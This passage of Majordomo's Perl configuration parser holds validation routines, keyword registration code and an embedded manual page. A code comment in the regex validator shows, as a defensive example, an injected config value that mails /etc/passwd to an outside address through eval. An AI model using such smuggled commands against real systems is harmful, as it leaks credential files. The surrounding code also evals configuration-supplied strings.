	        "integer |$num| contains a ^A at line $.\n"), next
	            if $re =~ /\001/;

	    push(@return_array, $num) if $num =~ /^[1-9][0-9]*\.[0-9]+$/;
	    push(@return_array, $num) if $num =~ /^$/;		
	    push(@local_errors,
		 "$num is not an floating point number at line $.\n");
 	}

        if (@local_errors) {
              push(@errors, @local_errors);
	      return "";
	      }
        return (join("\001", @return_array));
}

sub grab_regexp_array {
	local($value, $list, $key) = @_;
	local(@re_array) = split(/\001/,$value);
	local(@return_re, @re_errors, $re, $dlm) = ();
 
	foreach $re (@re_array){
 	    if ($re =~ /\001/) {
 		push(@re_errors,
 		    "regular expression |$re| contains a ^A at line $.\n");
 	    }
	    # if we don't check for an extra deliminator here, an 
	    # evil person could sneak stuff in here, since it 
	    # is eval'd...
	    # Ie:
	    # advertise = << END
	    # m:yyy: ; `/bin/mail evil_hacker < /etc/passwd` ; "bar" =~ m:yyy:
	    # END
	    #
	    elsif ($re !~ m:^((/)|m([^\w\s])):) {
 		push(@re_errors,
 		    "|$re| not a valid pattern match expression at line $.\n");
	    }
	    else {
		$dlm=($2||$3);
		if ($re !~ m:^m?$dlm[^\\$dlm]*(\\.[^\\$dlm]*)*$dlm[gimosx]*$:) {
		    push(@re_errors,
 		     "|$re| not a valid pattern match expression at line $.\n");
		}
		elsif (eval "'' =~ $re", $@) {
		    push(@re_errors, $@);
		}
		else {
		    push(@return_re, $re);
		}
	    }
 	}

        if (@re_errors) {
              push(@errors, @re_errors);
	      return "";
	      }
        return (join("\001", @return_re));
}

sub grab_restrict_post {
	local($list) = @_;
	local(@files) = ();
	
        @files = split (/[:\s]+/, $list);
	foreach (@files) {
	    # add listdir if no leading /
	    #
	    $_ = ( m@^/@ ? $_ : "$main'listdir/$_"); #';
	    push(@errors, "Can't find restrict_post file $_ at line $.\n" )
		unless -e $_;
       }
   return ($list); # if the list isn't any good, resend is ok about it
}

sub grab_string {
  local($string) = @_;
  return($string);
}

# accumulate an array of strings allowing escape sequences stared with a -.
sub grab_string_array {
	local($value, $list, $key) = @_;
	local(@s_array) = split(/\001/,$value);
	local(@return_s, @s_errors, $str) = ();
 
	foreach $str (@s_array){

                # a single - on a line means a blank character/line
                $str = '' if ( $str eq '-' );
                $str =~ s/^-(\s+)/$1/; # a - saves space
                $str =~ s/^--/-/; # a -- means -

                push(@return_s, $str),
			 next if $str !~ /\001/;
            push(@s_errors,
	        "string |$str| contains a ^A at line $.\n");
 	}

        if (@s_errors) {
              push(@errors, @s_errors);
	      return "";
	      }
        return (join("\001", @return_s));
}

sub grab_word {
  local($word) = @_;

        push(@errors, "More then one word " . $count .
		"in value $_ at line $.\n") 
		if ($count = split(' ', $word)) > 1 ;
   return ($word);
}


####
#
# start utility routines
#
####
sub config'get_def {
	local($key, $default, $list) = @_;
	local($parser) = ();
	local($digest) = undef;

	# sometimes the list variable doesn't get overridden
	#$orig_list = $list;    # Does anyone ever need this?
	$list =~ s/.new$//;     # chomp a .new extention to load
				# a replacement file
	$baselist = $list;      # Compatibility

	&main'abort( "Improper number of args to get_def") unless defined $list;

	# discover what mode we are working in
	  # are we generating a digest list
	$digest = 1 if $list =~ /-digest$/;

	if ( $default =~ s/^#!// ) {
	    $default = eval("$default");
	    print $@ if $@ ne "";
	}

	$parser = $parse_function{$key};
	return(($default eq '') ? '' : &$parser($default, $list, $key));
}

sub substitute_values {
  # BUG the string \$ can't be embedded, but I see no reason it should
  # be needed
      local($string, $list) = @_;

	if ( index($string, '$') < $[ ) {
	        # if there is no $ in the string, just return the string
		return($string);
        }

	# hide escaped \$ variable references
	$string =~ s/\\\$/\002/;

	$string =~ s/\$LIST/$list/g;
	$string =~ s/\$VERSION/$main'majordomo_version/g;
	$string =~ s/\$SENDER/$main'from/g;

	# replace the escaped $'s
	$string =~ s/\002/\$/;

	return($string);
}


####
#
# Routines for package main.
#
####


# get the boolean value. Return true if not the number 0 or null.
sub main'cf_ck_bool { #given the name of the list and item, look it up
  local($list, $key) = @_;

  return (1) if (($main'config_opts{$list,$key} != 0) &&
		    $main'config_opts{$list,$key} ne '');
  return (0);
}


sub main'new_keyword { # all args are required
    local($key,$value,$function,$subsystem,$comment) = @_;

    die "new_keyword: key is not defined" if !defined($key);
    # value can be undef, so don't check for defined state of value.
    die "new_keyword: function is not defined" if !defined($function);
    die "new_keyword: subsystem is not defined" if !defined($subsystem);
    die "new_keyword: comments are not defined" if !defined($comment);

    $key =~ s/^\s*//;    # strip whitespace front
    $key =~ s/\s*$//;    # strip whitespace rear
    $value =~ s/^\s*//;  # strip whitespace front 
    $value =~ s/\s*$//;  # strip whitespace rear
    $function =~ s/^\s*//;  # strip whitespace front 
    $function =~ s/\s*$//;  # strip whitespace rear
    $subsystem =~ s/^\s*//;  # strip whitespace front 
    $subsystem =~ s/\s*$//;  # strip whitespace rear
    $comment =~ s/^\s*//;  # strip whitespace front 
    $comment =~ s/\s*$//;  # strip whitespace rear

    die "Keyword $key > 18 characters" if length($key) > 18;

    $known_keys{$key} = ( defined($value)  ? $value : ''); # use null value
							   # for undef
    if (!defined(&$function)) {
	die "Unknown function $function (package config) for keyword $key\n";
    }

    $parse_function{$key} = $function; # set the function

    $subsystem{$key} = $subsystem; # set the subsystem

    $comments{$key} = $comment if defined $comment; # set the documentation
}

# a dummy main for testing. You aren't expected to understand this junk.
#package main;
#require "majordomo.cf";
#require 'mm_match_user' ;
#
#
#
#&main'get_config($ARGV[0],$ARGV[1]);
#&config'writeconfig($ARGV[0], $ARGV[1]);
#foreach $i (sort(keys(%main'config_opts))) {
#local($j) = $i;
#$j =~ s/^$ARGV[1]$;//;
#$j =~ s/^$ARGV[1]//;
#print ($j . " = " . 
#      ($main'config_opts{$i} eq ''? "undef" : $main'config_opts{$i}) . "\n")
#      unless $j eq '';
#}
#print @config'errors;
#

1;  # keep require happy.

###############################################################

# These next few lines are legal in both Perl and nroff.

.00;                       # finish .ig
 
'di           \" finish diversion--previous line must be blank
.nr nl 0-1    \" fake up transition to first page again
.nr % 0         \" start at page 1
'; __END__ ##### From here on it's a standard manual page #####
.TH config_parse.pl 8
.SH NAME
config_parse.pl, new_keyword, config_opts, %known_keys \- Add a new keyword 
		to the majordomo configuration file parser.
.SH Syntax
.nf
.B &main'new_keyword(key, default_value, parse_function, subsystem, comment)

.B $config_opts{<listname>, key}
.SH Description

The new_keyword function registers a new keyword with the majordomo
configuration file parser. The default value, or an overriding value
specified in the config file will be put into the array
%main'config_opts, which is indexed by the listname and the key.

The arguments to main'new_keyword are:
.TP 15
key
The text of the keyword in the configuration file (e.g.
subscription_policy).  It should use the '_' as a word separator and
should be less than 20 characters total length.

.TP 15
default_value
The default value for the string. Empty quotes must be used if the
value is to be null. If the default value starts with the characters
'#!', the string is eval'led in the context of the config package. The
function config'get_def performs the evaluation. Besides the global
values, the name of the list is available in the variable "$list", and
the current key name is available in the variable "$key".

If the keyword is an enumerated type, the value must follow this form:

.I	value1^Avalue2^Avalue3^Avalue2

^A is control-A (ascii octal value 001). The default value for the
keyword is the last value in the list (note: that value2 must appear
twice, once to show it is a member of the list, and last to show that
it is the default value.)

If the value can be an array, the default value can be a ^A separated
set of elements. These values correspond to the possible values of the
%known_keys array Before installing the config_opts code for the first
time, it is a good idea to look over the perl array %known_keys, and
change the default values.

.TP 15
parse_function
The parse function is used to validate the data supplied by the list
maintainer and to try to point out problems with the data. There are a
number of parse functions defined, all of the MUST be in the config
package. If you are writing a parse function of your own, make sure
that it is in the config package, otherwise the parser won't find it.

By convention all of the parse functions supplied with in
config_parse.pl start with grab_. The name of the function is used to
derive a type value for the inline documentation. All functions that
are able to accept multiple arguments must end in _array. The
supplied functions are:

.RS 15
.TP 10
grab_absolute_dir
A root anchored directory
.TP 10
grab_absolute_file 
A root anchored file
.TP 10
grab_bool
choose from: yes, no, y, n
.TP 10
grab_enum
One of a list of possible values
.TP 10
grab_integer
an integer (string made up of the digits 0-9, no decimal point)
.TP 10
grab_integer_array
an array of integers (string made up of the digits 0-9, no decimal point)
.TP 10
grab_float
a floating point number with decimal point. Exponential notation is not
supported.
.TP 10
grab_float_array
an array of floating point numbers with decimal point.
Exponential notation is not supported.
.TP 10
grab_regexp_array
an array of perl style regular expression with leading/trailing /'s
.TP 10
grab_restrict_post
a series of space or : separated file names in which
to look up the senders address
(restrict-post should go away to be replaced by an
array of files)
.TP 10
grab_string
any text up until a \n stripped of leading and trailing whitespace
.TP 10
grab_string_array
handle an array of strings possibly sperated by ^A characters.
.TP 10
grab_word
any text with no embedded whitespace
.RE
 
.TP 15 
subsystem 
A unique name for the value for your subsystem. This is used to clear
out old keywords when a subsystem module is removed.  Only two
subsystems are defined by default: majordomo and resend. If the digest
program is converted, then the digest subsystem will also be defined.

I would suggest that the unique identifiers for addin subsystems to
the majordomo command be prefixed with "maj-".

.TP 15
comment
Documentary text that is filled and printed in the config file. This
text should describe the purpose and function of the keyword.

.SH Diagnostics

The function calls die if any of its arguments are missing. While this
isn't as nice as trying to handle the error, it sure does get the
attention of the majordomo maintainer.

.SH Bugs
There is no way to add text describing a new type to the header of the
config file. The documentation on a new type has to be done in the
comment text.

The default string for an enumerated type shouldn't require
duplication of the default value. The default value string shouldn't
be so heavily overloaded either.

This man page should be more explicit about the checks done by the
parse functions.

new_keyword doesn't yet check and reject duplicate keywords, so it is
up to the majordomo maintainer to make sure that keywords don't
conflict.

main'cf_ck_bool should be documented here as well.

.SH See Also
majordomo(8), perl(1)

